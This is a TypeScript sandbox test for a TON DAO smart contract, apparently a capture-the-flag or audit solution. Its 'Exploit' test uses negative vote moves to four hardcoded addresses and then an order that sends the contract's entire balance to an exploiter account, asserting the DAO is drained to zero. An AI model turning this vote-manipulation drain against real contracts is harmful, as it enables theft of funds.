import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
import { Address, beginCell, Cell, Dictionary, fromNano, toNano } from '@ton/core';
import { Dao, value } from '../wrappers/wrappers/DAO';
import '@ton/test-utils';
import { compile } from '@ton/blueprint';

// npx blueprint test Dao.spec.ts
describe('Dao', () => {
    let code: Cell;

    beforeAll(async () => {
        code = await compile('Dao');
    });

    let blockchain: Blockchain;
    let owner: SandboxContract<TreasuryContract>;
    let exploiter: SandboxContract<TreasuryContract>;
    let dao: SandboxContract<Dao>;
    let initBalance: bigint;

    beforeEach(async () => {
        initBalance = toNano('100');
        blockchain = await Blockchain.create();

        owner = await blockchain.treasury('owner');
        exploiter = await blockchain.treasury('exploiter');

        const emptyDict = Dictionary.empty<bigint, bigint>(Dictionary.Keys.BigUint(256), value);

        dao = blockchain.openContract(
            Dao.createFromConfig({ global_votes: emptyDict, proposals: emptyDict, total_votes: 0n }, code),
        );

        const deployResult = await dao.sendDeploy(owner.getSender(), initBalance);

        expect(deployResult.transactions).toHaveTransaction({
            from: owner.address,
            to: dao.address,
            deploy: true,
            success: true,
        });
    });

    it('should deploy', async () => {
        const balance = (await blockchain.getContract(dao.address)).balance;
        expect(balance <= initBalance && balance > 0n).toBe(true);

        expect(await dao.getTotalVotes()).toEqual(60000n);
    });

    it('Exploit', async () => {
        const balanceBefore = (await blockchain.getContract(dao.address)).balance;

        await sendMoveVotes('EQCD39VS5jcptHL8vMjEXrzGaRcCVYto7HUn4bpAOg8xqB2N');
        await sendMoveVotes('EQAhE3sLxHZpsyZ_HecMuwzvXHKLjYx4kEUehhOy2JmCcHCT');
        await sendMoveVotes('EQCtiv7PrMJImWiF2L5oJCgPnzp-VML2CAt5cbn1VsKAxLiE');
        await sendMoveVotes('EQAAFhjXzKuQ5N0c96nsdZQWATcJm909LYSaCAvWFxVJP80D');

        const message: Cell = beginCell()
            .storeRef(
                beginCell()
                    .storeUint(0x18, 6)
                    .storeAddress(exploiter.address)
                    .storeCoins(0)
                    .storeUint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
                    .endCell(),
            )
            .storeUint(128, 8)
            .endCell();

        await dao.sendAddOrder(exploiter.getSender(), toNano('0.5'), message);

        const balanceAfter = (await blockchain.getContract(dao.address)).balance;

        expect(balanceAfter).toEqual(0n);
    });

    const sendMoveVotes = async (address: string) => {
        await dao.sendMoveVotes(exploiter.getSender(), toNano('0.5'), Address.parse(address), -10000n);
    };
});
